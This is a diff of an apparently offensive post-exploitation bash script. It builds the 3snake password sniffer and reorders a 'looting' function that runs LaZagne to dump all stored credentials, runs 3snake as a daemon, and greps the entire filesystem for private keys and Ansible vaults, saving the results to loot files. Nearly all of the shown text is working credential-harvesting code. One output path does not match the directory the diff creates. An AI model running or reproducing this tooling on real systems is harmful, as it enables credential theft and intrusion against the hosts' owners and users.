@@ -82,18 +82,18 @@ download_tools() {
     fi
     unzip -qq nmap.zip
     unzip -qq 3snake.zip
+    cd 3snake/ || exit
+    make
+    cd ..
     rm nmap.zip 3snake.zip
     chmod +x linpeas.sh les.sh traitor* pspy* lazagne*
 }
 
 looting() {
     cd blood || exit
-    cd 3snake/ || exit
-    make
+    mkdir loot
+    ./lazagne* all | tee -a loot/lazagne.txt
     ./3snake -d -o ../loot/3snake.txt
-    cd ../loot || exit
-    ../lazagne* all | tee -a loot/lazagne.txt
-
     echo "======================= POSSIBLE PRIV KEYS:" | tee -a loot/priv_keys.txt
     grep -r -a "PRIVATE KEY-----" / 2>/dev/null | tee -a loot/priv_keys.txt
     echo "======================= POSSIBLE ANSBILE VAULT:" | tee -a loot/ansible_vault.txt
